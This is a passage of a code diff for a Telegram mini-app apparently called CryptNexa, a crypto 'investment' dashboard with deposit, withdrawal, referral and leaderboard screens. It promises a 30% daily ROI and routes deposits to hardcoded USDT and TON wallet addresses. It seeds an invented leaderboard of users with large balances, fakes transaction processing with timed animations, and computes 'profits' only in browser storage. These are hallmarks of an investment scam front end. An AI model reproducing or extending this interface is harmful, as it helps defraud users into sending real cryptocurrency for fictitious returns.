+        <div class="bg-brand-bg/80 p-3 rounded-2xl border border-brand-border flex items-center justify-between">
+          <div class="flex items-center gap-2.5 text-gray-400">
+            <div class="w-7 h-7 rounded-lg bg-amber-500/10 text-amber-400 flex items-center justify-center"><i data-lucide="shield-alert" class="w-4 h-4"></i></div>
+            <span>Security</span>
+          </div>
+          <span class="font-extrabold text-amber-400 bg-amber-500/10 border border-amber-500/20 px-2.5 py-1 rounded-full text-[11px]">A+ 2FA</span>
+        </div>
+
+        <div class="bg-brand-bg/80 p-3 rounded-2xl border border-brand-border flex items-center justify-between">
+          <div class="flex items-center gap-2.5 text-gray-400">
+            <div class="w-7 h-7 rounded-lg bg-purple-500/10 text-purple-400 flex items-center justify-center"><i data-lucide="globe" class="w-4 h-4"></i></div>
+            <span>Region</span>
+          </div>
+          <span class="font-mono font-bold text-gray-200">Global Node</span>
+        </div>
+      </div>
+
+      <button onclick="switchTab('dashboard')" class="w-full relative group overflow-hidden rounded-xl p-[1px] font-extrabold text-xs active:scale-95 transition-all shadow-lg">
+        <span class="absolute inset-0 bg-gradient-to-r from-emerald-500 to-cyan-400 opacity-80 group-hover:opacity-100 transition-opacity"></span>
+        <span class="relative flex items-center justify-center gap-2 rounded-xl bg-brand-bg px-4 py-3 text-emerald-400 group-hover:bg-transparent group-hover:text-black transition-all">
+          <i data-lucide="arrow-left" class="w-4 h-4"></i> Return to Dashboard
+        </span>
+      </button>
+    </div>
+  </main>
+
+  <!-- NAV -->
+  <nav class="fixed bottom-0 left-0 right-0 bg-[#0b101b]/95 border-t border-emerald-500/20 backdrop-blur-xl z-40 px-2 py-3 flex justify-between items-center shadow-2xl">
+    <button onclick="switchTab('dashboard')" id="nav-dashboard" class="flex flex-col items-center gap-1 text-emerald-400 flex-1 transition-all active:scale-95">
+      <i data-lucide="layout-dashboard" class="w-5 h-5"></i>
+      <span class="text-[9px] font-extrabold tracking-wide">Home</span>
+    </button>
+    <button onclick="switchTab('wallet'); backToWalletOverview()" id="nav-wallet" class="flex flex-col items-center gap-1 text-gray-400 flex-1 transition-all active:scale-95">
+      <i data-lucide="wallet" class="w-5 h-5"></i>
+      <span class="text-[9px] font-extrabold tracking-wide">Wallet</span>
+    </button>
+    <button onclick="switchTab('history')" id="nav-history" class="flex flex-col items-center gap-1 text-gray-400 flex-1 transition-all active:scale-95">
+      <i data-lucide="history" class="w-5 h-5"></i>
+      <span class="text-[9px] font-extrabold tracking-wide">History</span>
+    </button>
+    <button onclick="switchTab('community')" id="nav-community" class="flex flex-col items-center gap-1 text-gray-400 flex-1 transition-all active:scale-95">
+      <i data-lucide="users" class="w-5 h-5"></i>
+      <span class="text-[9px] font-extrabold tracking-wide">Community</span>
+    </button>
+    <button onclick="switchTab('support')" id="nav-support" class="flex flex-col items-center gap-1 text-gray-400 flex-1 transition-all active:scale-95">
+      <i data-lucide="headphones" class="w-5 h-5"></i>
+      <span class="text-[9px] font-extrabold tracking-wide">Support</span>
+    </button>
+    <button onclick="switchTab('referral')" id="nav-referral" class="flex flex-col items-center gap-1 text-gray-400 flex-1 transition-all active:scale-95">
+      <i data-lucide="share-2" class="w-5 h-5"></i>
+      <span class="text-[9px] font-extrabold tracking-wide">Referral</span>
+    </button>
+    <button onclick="switchTab('profile')" id="nav-profile" class="flex flex-col items-center gap-1 text-gray-400 flex-1 transition-all active:scale-95">
+      <i data-lucide="user" class="w-5 h-5"></i>
+      <span class="text-[9px] font-extrabold tracking-wide">Profile</span>
+    </button>
+  </nav>
+
+  <!-- INVEST MODAL -->
+  <div id="invest-modal" class="modal-overlay hidden">
+    <div class="glass-card rounded-2xl w-full max-w-sm p-5 space-y-4 relative border border-emerald-500/30 modal-animate-in">
+      <button onclick="closeModal('invest-modal')" class="absolute top-4 right-4 text-gray-400 hover:text-white p-1 rounded-lg bg-white/5">
+        <i data-lucide="x" class="w-5 h-5"></i>
+      </button>
+
+      <h3 class="font-extrabold text-white text-base" id="modal-plan-title">Plan</h3>
+
+      <div class="space-y-3">
+        <div>
+          <label class="text-xs text-gray-400 font-bold uppercase">Investment Amount ($)</label>
+          <input type="number" id="modal-amount-input" oninput="calculateModalProfit()" class="w-full mt-1 bg-brand-bg border border-brand-border rounded-xl p-3 text-sm text-white font-bold">
+          <p class="text-[11px] text-gray-500 mt-1" id="modal-limits-text">Min: $5 - Max: $99</p>
+        </div>
+
+        <div class="p-3 bg-brand-bg rounded-xl border border-brand-border space-y-1.5 text-xs">
+          <div class="flex justify-between text-gray-400"><span>Daily ROI:</span><span id="modal-daily-rate" class="text-emerald-400 font-bold">30%</span></div>
+          <div class="flex justify-between text-gray-400"><span>Daily Profit:</span><span id="modal-daily-profit" class="text-white font-bold">$0.00</span></div>
+          <div class="flex justify-between text-gray-400"><span>Net Profit:</span><span id="modal-net-profit" class="text-emerald-400 font-bold">$0.00</span></div>
+          <div class="flex justify-between text-gray-400 pt-1 border-t border-brand-border"><span>Total Payout:</span><span id="modal-total-payout" class="text-cyan-400 font-bold">$0.00</span></div>
+        </div>
+      </div>
+
+      <button onclick="confirmInvestment()" class="w-full gradient-bg text-black font-extrabold py-3 rounded-xl text-sm shadow-lg active:scale-95 transition-all">
+        Confirm & Start
+      </button>
+    </div>
+  </div>
+
+  <!-- SIMPLE PROCESSING MODAL -->
+  <div id="simple-processing-overlay" class="simple-processing-overlay">
+    <div class="simple-processing-card">
+      <div id="processing-spinner" class="simple-spinner"></div>
+      <div id="processing-checkmark" class="simple-checkmark" style="display:none;">
+        <svg viewBox="0 0 24 24">
+          <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h3 id="processing-title-text" class="simple-processing-title">Processing...</h3>
+      <p id="processing-subtitle-text" class="simple-processing-subtitle">Please wait while we process your transaction.</p>
+      <div class="simple-processing-amount">
+        <span class="simple-processing-amount-label">AMOUNT</span>
+        <span id="processing-amount-text" class="simple-processing-amount-value">$0.00</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- RECEIPT MODAL -->
+  <div id="receipt-modal" class="modal-overlay hidden">
+    <div id="receipt-content-container" class="w-full max-w-[340px] max-h-[95vh] flex flex-col"></div>
+  </div>
+
+  <!-- TOAST -->
+  <div id="admin-notify-popup">
+    <div class="toast-container">
+      <div class="p-4 flex items-start gap-3.5">
+        <div id="notify-icon-box" class="w-11 h-11 rounded-2xl bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 flex items-center justify-center shrink-0 shadow-lg shadow-emerald-500/20">
+          <i data-lucide="check-circle" class="w-6 h-6"></i>
+        </div>
+        <div class="flex-1 space-y-1 text-left">
+          <h4 id="notify-title" class="text-sm font-black text-white tracking-wide">Success</h4>
+          <p id="notify-desc" class="text-[11px] text-gray-300 leading-relaxed">Transaction processed successfully.</p>
+          <div class="flex items-center gap-1.5 pt-1">
+            <div class="w-1.5 h-1.5 rounded-full bg-cyan-400"></div>
+            <span id="notify-time" class="text-[9px] text-cyan-400 font-mono font-bold">Secure Node • Just now</span>
+          </div>
+        </div>
+        <button onclick="hideAdminNotify()" class="text-gray-400 hover:text-white p-1.5 rounded-lg bg-white/5 active:scale-90 transition-all">
+          <i data-lucide="x" class="w-3.5 h-3.5"></i>
+        </button>
+      </div>
+      <div class="toast-progress"></div>
+    </div>
+  </div>
+
+  <!-- MODERN ALERT -->
+  <div id="modern-alert-overlay" class="modern-alert-overlay" onclick="closeModernAlert(event)">
+    <div class="modern-alert-card" id="modern-alert-card" onclick="event.stopPropagation()">
+      <div class="modern-alert-glow" id="modern-alert-glow"></div>
+      <div class="modern-alert-icon-wrap" id="modern-alert-icon"><i data-lucide="alert-circle"></i></div>
+      <h3 class="modern-alert-title" id="modern-alert-title">Notice</h3>
+      <p class="modern-alert-message" id="modern-alert-message">Something needs your attention.</p>
+      <button class="modern-alert-btn" id="modern-alert-btn" onclick="closeModernAlert()">
+        <i data-lucide="check"></i> <span>Got it</span>
+      </button>
+      <div class="modern-alert-id" id="modern-alert-id">APEX · SECURE ALERT</div>
+    </div>
+  </div>
+
+  <script>
+    lucide.createIcons();
+
+    let tg = window.Telegram?.WebApp;
+    let currentUserProfile = { name: 'Investor', username: '@investor', id: '0' };
+
+    if (tg) {
+      tg.expand();
+      tg.enableClosingConfirmation();
+      if (tg.initDataUnsafe?.user) {
+        const user = tg.initDataUnsafe.user;
+        currentUserProfile.name = user.first_name + (user.last_name ? ' ' + user.last_name : '');
+        currentUserProfile.username = user.username ? '@' + user.username : '@User_' + user.id;
+        currentUserProfile.id = user.id.toString();
+        document.getElementById('user-name').innerText = currentUserProfile.name;
+        document.getElementById('user-avatar').innerText = user.first_name.charAt(0);
+      }
+    }
+
+    const ADMIN_TELEGRAM_ID = '7076265514';
+    const isAdmin = currentUserProfile.id === ADMIN_TELEGRAM_ID;
+
+    document.getElementById('profile-fullname').innerText = currentUserProfile.name;
+    document.getElementById('profile-username').innerText = currentUserProfile.username;
+    document.getElementById('profile-telegram-id').innerText = currentUserProfile.id;
+    document.getElementById('profile-big-avatar').innerText = currentUserProfile.name.charAt(0);
+    document.getElementById('ref-link').value = `https://t.me/CRYPTNEXABot?start=ref_${currentUserProfile.id}`;
+
+    let userPortfolio = JSON.parse(localStorage.getItem('cryptnexa_portfolio_' + currentUserProfile.id) || JSON.stringify({
+      balance: 0.00, totalDeposited: 0.00, totalWithdrawn: 0.00, lockedBalance: 0.00
+    }));
+
+    let transactionsHistory = JSON.parse(localStorage.getItem('cryptnexa_tx_' + currentUserProfile.id) || '[]');
+    let supportTickets = JSON.parse(localStorage.getItem('cryptnexa_support_' + currentUserProfile.id) || '[]');
+    let activeInvestments = JSON.parse(localStorage.getItem('cryptnexa_inv_' + currentUserProfile.id) || '[]');
+    let uploadedScreenshotData = null;
+    let uploadedScreenshotBase64 = null;
+    let pendingReceiptTx = null;
+
+    // Community users - only visible to admin
+    let communityUsers = JSON.parse(localStorage.getItem('cryptnexa_community_users') || 'null');
+    if (!communityUsers) {
+      communityUsers = [
+        { id: '7076265514', name: 'Alexander Cross', username: '@alex_whale', balance: 245680.50, tier: 'vip', avatar: 'AC', color: '#a855f7' },
+        { id: '7284910382', name: 'Sarah Chen', username: '@sarah_c', balance: 128450.00, tier: 'vip', avatar: 'SC', color: '#a855f7' },
+        { id: '8392017465', name: 'Mohammed Ali', username: '@m_ali_apex', balance: 89230.75, tier: 'gold', avatar: 'MA', color: '#f59e0b' },
+        { id: '9102837465', name: 'Elena Petrova', username: '@elena_p', balance: 67890.20, tier: 'gold', avatar: 'EP', color: '#f59e0b' },
+        { id: '6283749182', name: 'David Kim', username: '@david_kk', balance: 45210.00, tier: 'gold', avatar: 'DK', color: '#f59e0b' },
+        { id: '7483920183', name: 'Fatima Hassan', username: '@fatima_h', balance: 34500.50, tier: 'silver', avatar: 'FH', color: '#06b6d4' },
+        { id: '8192736450', name: 'James Wilson', username: '@jwilson', balance: 23480.00, tier: 'silver', avatar: 'JW', color: '#06b6d4' },
+        { id: '9283746501', name: 'Anna Schmidt', username: '@anna_s', balance: 18240.75, tier: 'silver', avatar: 'AS', color: '#06b6d4' },
+        { id: '8192736540', name: 'Omar Abdullah', username: '@omar_a', balance: 12450.00, tier: 'silver', avatar: 'OA', color: '#06b6d4' },
+        { id: '7382910482', name: 'Lisa Martinez', username: '@lisa_m', balance: 8920.25, tier: 'starter', avatar: 'LM', color: '#10b981' },
+        { id: '6473829104', name: 'Ahmed Yusuf', username: '@ahmed_y', balance: 5420.00, tier: 'starter', avatar: 'AY', color: '#10b981' },
+        { id: '9182736450', name: 'Maria Silva', username: '@maria_s', balance: 3180.50, tier: 'starter', avatar: 'MS', color: '#10b981' }
+      ];
+      
+      if (!communityUsers.find(u => u.id === currentUserProfile.id) && currentUserProfile.id !== '0' && !isAdmin) {
+        const tier = userPortfolio.balance >= 2000 ? 'vip' : userPortfolio.balance >= 500 ? 'gold' : userPortfolio.balance >= 100 ? 'silver' : 'starter';
+        const tierColors = { vip: '#a855f7', gold: '#f59e0b', silver: '#06b6d4', starter: '#10b981' };
+        communityUsers.push({
+          id: currentUserProfile.id,
+          name: currentUserProfile.name,
+          username: currentUserProfile.username,
+          balance: userPortfolio.balance + userPortfolio.lockedBalance,
+          tier: tier,
+          avatar: currentUserProfile.name.substring(0, 2).toUpperCase(),
+          color: tierColors[tier]
+        });
+      }
+      
+      localStorage.setItem('cryptnexa_community_users', JSON.stringify(communityUsers));
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      updateWalletUI();
+      renderHistory();
+      renderSupportTickets();
+      renderActiveInvestments();
+      setupCommunityVisibility();
+      updateCommunityStats();
+      
+      setInterval(pollServerForSupportReplies, 2500);
+      setInterval(pollTelegramCallbackQueries, 2500);
+      setInterval(updateLiveProfits, 1000);
+      setInterval(updateBalanceTimestamp, 10000);
+    });
+
+    function saveAppData() {
+      localStorage.setItem('cryptnexa_portfolio_' + currentUserProfile.id, JSON.stringify(userPortfolio));
+      localStorage.setItem('cryptnexa_tx_' + currentUserProfile.id, JSON.stringify(transactionsHistory));
+      localStorage.setItem('cryptnexa_support_' + currentUserProfile.id, JSON.stringify(supportTickets));
+      localStorage.setItem('cryptnexa_inv_' + currentUserProfile.id, JSON.stringify(activeInvestments));
+    }
+
+    /* ===== COMMUNITY FUNCTIONS ===== */
+    function setupCommunityVisibility() {
+      const adminSection = document.getElementById('admin-leaderboard-section');
+      const nonAdminMsg = document.getElementById('non-admin-message');
+      
+      if (isAdmin) {
+        adminSection.style.display = 'block';
+        nonAdminMsg.style.display = 'none';
+        renderCommunityUsers();
+      } else {
+        adminSection.style.display = 'none';
+        nonAdminMsg.style.display = 'block';
+      }
+    }
+
+    function updateCommunityStats() {
+      const totalUsers = communityUsers.length;
+      const activeStakes = communityUsers.reduce((sum, u) => sum + (u.id === currentUserProfile.id ? activeInvestments.length : 0), 0);
+      const totalTVL = communityUsers.reduce((sum, u) => sum + (u.balance || 0), 0);
+      
+      document.getElementById('community-total-users').innerText = totalUsers;
+      document.getElementById('community-active-investments').innerText = activeStakes;
+      document.getElementById('community-total-tvl').innerText = '$' + formatCompactNumber(totalTVL);
+      const badge = document.getElementById('community-user-count-badge');
+      if (badge) badge.innerText = `${totalUsers} users`;
+    }
+
+    function formatCompactNumber(num) {
+      if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
+      if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
+      return num.toFixed(0);
+    }
+
+    function renderCommunityUsers(filterText = '') {
+      if (!isAdmin) return;
+      
+      const container = document.getElementById('community-users-list');
+      if (!container) return;
+      
+      const sorted = [...communityUsers].sort((a, b) => b.balance - a.balance);
+      
+      const filtered = filterText.trim() === '' 
+        ? sorted 
+        : sorted.filter(u => 
+            u.id.toLowerCase().includes(filterText.toLowerCase()) ||
+            u.name.toLowerCase().includes(filterText.toLowerCase()) ||
+            u.username.toLowerCase().includes(filterText.toLowerCase())
+          );
+      
+      container.innerHTML = '';
+      
+      if (filtered.length === 0) {
+        container.innerHTML = `
+          <div class="glass-card rounded-xl p-6 text-center border border-brand-border">
+            <div class="w-12 h-12 rounded-2xl bg-emerald-500/10 flex items-center justify-center mx-auto mb-3">
+              <i data-lucide="search-x" class="w-6 h-6 text-emerald-400"></i>
+            </div>
+            <p class="text-sm font-bold text-white mb-1">No Users Found</p>
+            <p class="text-[11px] text-gray-400">Try a different search term</p>
+          </div>
+        `;
+        lucide.createIcons();
+        return;
+      }
+      
+      filtered.forEach((user) => {
+        const rank = sorted.findIndex(u => u.id === user.id) + 1;
+        const rankEmoji = rank === 1 ? '🥇' : rank === 2 ? '🥈' : rank === 3 ? '🥉' : '';
+        const isCurrentUser = user.id === currentUserProfile.id;
+        const tierLabels = { vip: 'VIP', gold: 'GOLD', silver: 'SILVER', starter: 'STARTER' };
+        
+        container.innerHTML += `
+          <div class="user-card ${isCurrentUser ? 'border-emerald-500/50 bg-emerald-500/5' : ''}">
+            <div class="flex items-center gap-3">
+              <div class="relative">
+                <div class="user-avatar-rank" style="background: linear-gradient(135deg, ${user.color}, ${user.color}dd); color: #000;">
+                  ${user.avatar}
+                </div>
+                ${rankEmoji ? `<span class="user-rank-badge">${rankEmoji}</span>` : ''}
+              </div>
+              <div class="flex-1 min-w-0">
+                <div class="flex items-center justify-between gap-2">
+                  <div class="min-w-0">
+                    <div class="flex items-center gap-1.5">
+                      <h5 class="user-name-display">${user.name}</h5>
+                      ${isCurrentUser ? '<span class="text-[7px] bg-emerald-500/20 text-emerald-400 px-1.5 py-0.5 rounded font-bold">YOU</span>' : ''}
+                    </div>
+                    <p class="user-id-display">${user.username} · ID: ${user.id}</p>
+                  </div>
+                  <div class="text-right shrink-0">
+                    <div class="user-balance-display">$${formatCompactNumber(user.balance)}</div>
+                    <div class="user-balance-label">BALANCE</div>
+                  </div>
+                </div>
+                <div class="flex items-center justify-between mt-1.5">
+                  <span class="user-tier-chip user-tier-${user.tier}">
+                    <i data-lucide="${user.tier === 'vip' ? 'crown' : user.tier === 'gold' ? 'flame' : user.tier === 'silver' ? 'shield' : 'sparkles'}" class="w-2.5 h-2.5"></i>
+                    ${tierLabels[user.tier]}
+                  </span>
+                  <span class="text-[9px] text-gray-500 font-mono">Rank #${rank}</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        `;
+      });
+      
+      lucide.createIcons();
+    }
+
+    function filterCommunityUsers() {
+      const input = document.getElementById('community-search-input');
+      const clearBtn = document.getElementById('community-search-clear');
+      const value = input.value;
+      
+      if (value.trim() !== '') {
+        clearBtn.style.display = 'block';
+      } else {
+        clearBtn.style.display = 'none';
+      }
+      
+      renderCommunityUsers(value);
+    }
+
+    function clearCommunitySearch() {
+      const input = document.getElementById('community-search-input');
+      input.value = '';
+      document.getElementById('community-search-clear').style.display = 'none';
+      renderCommunityUsers();
+    }
+
+    /* ===== END COMMUNITY ===== */
+
+    function showModernAlert({ title, message, type = 'info', icon = 'alert-circle', btnText = 'Got it' }) {
+      const overlay = document.getElementById('modern-alert-overlay');
+      const card = document.getElementById('modern-alert-card');
+      const iconWrap = document.getElementById('modern-alert-icon');
+      const glow = document.getElementById('modern-alert-glow');
+
+      const presets = {
+        success: { accent: 'linear-gradient(90deg, #10b981, #06b6d4)', iconBg: 'linear-gradient(145deg, #10b981, #06b6d4)', shadow: 'rgba(16, 185, 129, 0.6)', glow: 'radial-gradient(circle, rgba(16, 185, 129, 0.3) 0%, transparent 65%)' },
+        error: { accent: 'linear-gradient(90deg, #ef4444, #f97316)', iconBg: 'linear-gradient(145deg, #ef4444, #f97316)', shadow: 'rgba(239, 68, 68, 0.6)', glow: 'radial-gradient(circle, rgba(239, 68, 68, 0.3) 0%, transparent 65%)' },
+        warning: { accent: 'linear-gradient(90deg, #f59e0b, #f97316)', iconBg: 'linear-gradient(145deg, #f59e0b, #f97316)', shadow: 'rgba(245, 158, 11, 0.6)', glow: 'radial-gradient(circle, rgba(245, 158, 11, 0.3) 0%, transparent 65%)' },
+        info: { accent: 'linear-gradient(90deg, #3b82f6, #06b6d4)', iconBg: 'linear-gradient(145deg, #3b82f6, #06b6d4)', shadow: 'rgba(59, 130, 246, 0.6)', glow: 'radial-gradient(circle, rgba(59, 130, 246, 0.3) 0%, transparent 65%)' }
+      };
+
+      const p = presets[type] || presets.info;
+      card.style.setProperty('--alert-accent', p.accent);
+      card.style.setProperty('--alert-icon-bg', p.iconBg);
+      card.style.setProperty('--alert-shadow', p.shadow);
+      glow.style.background = p.glow;
+      iconWrap.style.background = p.iconBg;
+      iconWrap.style.boxShadow = `0 15px 35px -10px ${p.shadow}, inset 0 2px 0 rgba(255,255,255,0.2)`;
+      iconWrap.innerHTML = `<i data-lucide="${icon}"></i>`;
+      document.getElementById('modern-alert-title').innerText = title;
+      document.getElementById('modern-alert-message').innerText = message;
+      document.getElementById('modern-alert-btn').innerHTML = `<i data-lucide="check"></i> <span>${btnText}</span>`;
+      document.getElementById('modern-alert-id').innerText = 'CRYPTNEXA · ' + new Date().toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'});
+      lucide.createIcons();
+      overlay.classList.add('show');
+      if (tg?.HapticFeedback) {
+        if (type === 'success') tg.HapticFeedback.notificationOccurred('success');
+        else if (type === 'error') tg.HapticFeedback.notificationOccurred('error');
+        else tg.HapticFeedback.notificationOccurred('warning');
+      }
+    }
+
+    function closeModernAlert(e) {
+      document.getElementById('modern-alert-overlay').classList.remove('show');
+    }
+
+    function updateWalletUI() {
+      const liquid = userPortfolio.balance;
+      const locked = userPortfolio.lockedBalance;
+      const totalNet = liquid + locked;
+
+      document.getElementById('wallet-balance-display').innerText = `$${liquid.toFixed(2)}`;
+      document.getElementById('metric-liquid').innerText = `$${liquid.toFixed(2)}`;
+      document.getElementById('metric-locked').innerText = `$${locked.toFixed(2)}`;
+      const wml2 = document.getElementById('withdraw-max-label-2');
+      if (wml2) wml2.innerText = `$${liquid.toFixed(2)}`;
+      document.getElementById('stat-deposited').innerText = `$${userPortfolio.totalDeposited.toFixed(2)}`;
+      document.getElementById('stat-withdrawn').innerText = `$${userPortfolio.totalWithdrawn.toFixed(2)}`;
+      document.getElementById('main-balance').innerText = `$${totalNet.toFixed(2)}`;
+      document.getElementById('locked-balance').innerText = `$${locked.toFixed(2)}`;
+      document.getElementById('active-inv-count').innerText = `${activeInvestments.length} Active`;
+      const wap = document.getElementById('wallet-active-plans');
+      if (wap) wap.innerText = activeInvestments.length;
+      
+      if (userPortfolio.totalDeposited > 0) {
+        const roi = ((totalNet - userPortfolio.totalDeposited) / userPortfolio.totalDeposited) * 100;
+        document.getElementById('total-roi-badge').innerText = `+${roi.toFixed(1)}%`;
+        const wtroi = document.getElementById('wallet-total-roi');
+        if (wtroi) wtroi.innerText = `+${roi.toFixed(1)}%`;
+        const tp = document.getElementById('total-profit');
+        if (tp) tp.innerText = `$${(totalNet - userPortfolio.totalDeposited).toFixed(2)}`;
+      } else {
+        document.getElementById('total-roi-badge').innerText = `+0.0%`;
+        const wtroi = document.getElementById('wallet-total-roi');
+        if (wtroi) wtroi.innerText = `+0.0%`;
+        const tp = document.getElementById('total-profit');
+        if (tp) tp.innerText = `$0.00`;
+      }
+
+      if (activeInvestments.length > 0) {
+        const avgYield = activeInvestments.reduce((sum, inv) => sum + inv.rate, 0) / activeInvestments.length;
+        const ady = document.getElementById('avg-daily-yield');
+        if (ady) ady.innerText = `+${avgYield.toFixed(1)}%`;
+      } else {
+        const ady = document.getElementById('avg-daily-yield');
+        if (ady) ady.innerText = `+0.0%`;
+      }
+    }
+
+    function updateBalanceTimestamp() {
+      document.getElementById('balance-updated-time').innerText = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    }
+
+    function updateLiveProfits() {
+      if (activeInvestments.length === 0) return;
+      const now = Date.now();
+      let hasUpdates = false;
+      activeInvestments.forEach(inv => {
+        if (inv.startTime && inv.endTime) {
+          const elapsed = now - inv.startTime;
+          const totalDuration = inv.endTime - inv.startTime;
+          const progress = Math.min(elapsed / totalDuration, 1);
+          const dailyProfit = (inv.rawAmount * inv.rate) / 100;
+          const totalProfit = dailyProfit * inv.days;
+          inv.currentProfit = totalProfit * progress;
+          inv.progress = progress;
+          hasUpdates = true;
+        }
+      });
+      if (hasUpdates) { renderActiveInvestments(); saveAppData(); }
+    }
+
+    const cryptoWallets = {
+      usdt_trc20: { name: 'USDT (TRC20 - Tron)', address: 'TLPVBmQnS6VTV7MwzLzYy7EjUKqsKob7hs', logo: 'https://cryptologos.cc/logos/tether-usdt-logo.png?v=040', emoji: '₮', logoClass: 'network-logo-usdt', color: '#26A17B' },
+      usdt_bep20: { name: 'USDT (BEP20 - BNB Chain)', address: '0xe4484af8794b0fe2eccf433f7da7ac81935fc4a0', logo: 'https://cryptologos.cc/logos/bnb-bnb-logo.png?v=040', emoji: '⚡', logoClass: 'network-logo-bnb', color: '#F3BA2F' },
+      usdt_erc20: { name: 'USDT (ERC20 - Ethereum)', address: '0xe4484af8794b0fe2eccf433f7da7ac81935fc4a0', logo: 'https://cryptologos.cc/logos/ethereum-eth-logo.png?v=040', emoji: 'Ξ', logoClass: 'network-logo-eth', color: '#627EEA' },
+      ton: { name: 'TON (Toncoin)', address: 'UQBGo3k-EhMubMv4h3RqHszdcJdqoxttvZnuwDvPHbk8jl6P', logo: 'https://cryptologos.cc/logos/toncoin-ton-logo.png?v=040', emoji: '💎', logoClass: 'network-logo-ton', color: '#0098EA' }
+    };
+
+    let selectedDepositNetworkKey = 'usdt_trc20';
+    function selectCryptoMethod(methodKey) {
+      if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+      selectedDepositNetworkKey = methodKey;
+      document.querySelectorAll('[id^="card-"]').forEach(card => card.classList.remove('active'));
+      document.getElementById(`card-${methodKey}`).classList.add('active');
+      const data = cryptoWallets[methodKey];
+      document.getElementById('selected-network-badge').innerText = data.name;
+      document.getElementById('warning-net-name').innerText = data.name;
+      document.getElementById('wallet-address-text').value = data.address;
+      document.getElementById('qr-code-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(data.address)}&color=080b11&bgcolor=ffffff`;
+    }
+
+    function setDepositQuickAmount(amt) {
+      document.getElementById('deposit-amount-input').value = amt;
+      if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+    }
+
+    function setWithdrawQuickAmount(amt) {
+      document.getElementById('withdraw-amount').value = amt;
+      calculateWithdrawFee();
+      if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+    }
+
+    function toggleDepositQr() {
+      const qrContainer = document.getElementById('deposit-qr-container');
+      const toggleBtn = document.getElementById('qr-toggle-btn');
+      qrContainer.classList.toggle('hidden');
+      const isHidden = qrContainer.classList.contains('hidden');
+      toggleBtn.innerHTML = isHidden ? '<i data-lucide="qr-code" class="w-4 h-4"></i> Show QR Code' : '<i data-lucide="eye-off" class="w-4 h-4"></i> Hide QR Code';
+      lucide.createIcons();
+    }
+
+    function handleScreenshotUpload(event) {
+      const file = event.target.files[0];
+      if (file) {
+        uploadedScreenshotData = file.name;
+        const reader = new FileReader();
+        reader.onload = function(e) { uploadedScreenshotBase64 = e.target.result; };
+        reader.readAsDataURL(file);
+        document.getElementById('upload-placeholder-content').classList.add('hidden');
+        document.getElementById('upload-preview-container').classList.remove('hidden');
+        document.getElementById('uploaded-file-name').innerText = file.name;
+        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+      }
+    }
+
+    let selectedWithdrawNetworkKey = 'usdt_trc20';
+    function selectWithdrawNetwork(networkKey) {
+      if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+      selectedWithdrawNetworkKey = networkKey;
+      document.querySelectorAll('[id^="w-card-"]').forEach(card => card.classList.remove('active'));
+      document.getElementById(`w-card-${networkKey}`).classList.add('active');
+      const netNames = { usdt_trc20: 'TRC20', usdt_bep20: 'BEP20', usdt_erc20: 'ERC20', ton: 'TON' };
+      document.getElementById('withdraw-network-label').innerText = netNames[networkKey];
+      document.getElementById('warning-withdraw-net').innerText = netNames[networkKey];
+    }
+
+    function switchTab(tabId) {
+      if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.getElementById(`tab-${tabId}`).classList.add('active');
+      const navIds = ['dashboard', 'wallet', 'history', 'community', 'support', 'referral', 'profile'];
+      navIds.forEach(id => {
+        const btn = document.getElementById(`nav-${id}`);
+        if (btn) btn.classList.replace('text-emerald-400', 'text-gray-400');
+      });
+      const activeBtn = document.getElementById(`nav-${tabId}`);
+      if (activeBtn) activeBtn.classList.replace('text-gray-400', 'text-emerald-400');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function openWalletAction(action) {
+      const isDeposit = action === 'deposit';
+      switchTab('wallet');
+      document.getElementById('wallet-overview').classList.add('hidden');
+      document.getElementById('section-deposit').classList.toggle('hidden', !isDeposit);
+      document.getElementById('section-withdraw').classList.toggle('hidden', isDeposit);
+      setTimeout(() => window.scrollTo({ top: 0, behavior: 'smooth' }), 100);
+    }
+
+    function backToWalletOverview() {
+      document.getElementById('wallet-overview').classList.remove('hidden');
+      document.getElementById('section-deposit').classList.add('hidden');
+      document.getElementById('section-withdraw').classList.add('hidden');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function startSimpleProcessing(amount, txId, isWithdrawal) {
+      const overlay = document.getElementById('simple-processing-overlay');
+      const spinner = document.getElementById('processing-spinner');
+      const checkmark = document.getElementById('processing-checkmark');
+      const titleText = document.getElementById('processing-title-text');
+      const subtitleText = document.getElementById('processing-subtitle-text');
+      const amountText = document.getElementById('processing-amount-text');
+
+      amountText.innerText = amount;
+      titleText.innerText = isWithdrawal ? 'Processing Withdrawal...' : 'Processing Deposit...';
+      subtitleText.innerText = isWithdrawal ? 'Please wait while we process your withdrawal.' : 'Please wait while we process your deposit.';
+      spinner.style.display = 'block';
+      checkmark.style.display = 'none';
+      overlay.classList.add('show');
+      if (tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+
+      setTimeout(() => {
+        spinner.style.display = 'none';
+        checkmark.style.display = 'flex';
+        titleText.innerText = 'Transaction Submitted';
+        subtitleText.innerText = 'Your transaction has been submitted successfully.';
+        if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+      }, 1500);
+
+      setTimeout(() => {
+        overlay.classList.remove('show');
+        pendingReceiptTx = txId;
+        setTimeout(() => { openReceiptModal(txId); }, 250);
+      }, 2500);
+    }
+
+    function generateProReceiptHTML(tx) {
+      const isDeposit = tx.type === 'deposit';
+      const isWithdrawal = tx.type === 'withdraw';
+      const isInvestment = tx.type === 'investment';
